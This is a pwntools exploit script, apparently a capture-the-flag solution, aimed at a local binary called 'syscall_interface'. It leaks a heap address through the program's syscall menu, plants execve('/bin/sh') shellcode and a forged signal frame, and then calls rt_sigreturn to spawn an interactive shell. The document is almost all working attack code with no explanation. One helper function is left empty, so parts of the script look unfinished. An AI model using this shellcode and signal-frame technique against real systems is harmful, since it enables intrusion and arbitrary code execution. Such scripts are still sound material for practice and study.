from pwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

context(log_level='debug',os='linux')
context.arch='amd64'

p=None

libcpath=None
binarypath=['./syscall_interface']
def run(ip=None,port=None):
    global p
    if libcpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libcpath},aslr=0)
    elif ip and port:
        p=remote(ip,port)
    else:
        p=process(binarypath)

is_debug=True
def debugf(s=''):
    if is_debug:
        gdb.attach(p,s)

def menu(i):
    ru('choice:')
    sl(str(i))
def name(usrname):
    menu(1)
    ru(':')
    sd(usrname)
def exe(rax,args):
    menu(0)
    ru(':')
    sl(str(rax))
    ru(':')
    sd(str(args))
def exp():
    run()
    # debugf('nb EC8')
    exe(135,0x400000)
    exe(12,0)
    ru('RET(')
    heap=int(ru(')').strip(')'),16)
    print(hex(heap))
    target=heap-0x20f71
    
    def sigcontext(pc,sp=heap-0x1000):
        idx=['rbp','rbx','rdx','rax','rcx','rsp','rip']       # to rop use sigret fake read
    # sp=p64(heap-0x3000)
    shellcode=asm("mov al,59;push rcx;mov rdi,rsp;syscall").ljust(0x10,'\x90')
    rdx=p64(0)
    rax=p64(0xff)
    rcx=p64(0x068732f6e69622f)
    rsp=p64(heap-0x3000)
    rdi=p64(heap-0x20fc0)
    shellcode+=rdx+rax+rcx+rsp+rdi
    
    # debugf('nb EC8\nnb 100F')
    shellcode+='\xff'*(8)+p32(0x33)+p32(0x002a0011)
    name(shellcode)
    exe(12,0)
    
    exe(15,0)
    p.interactive()
exp()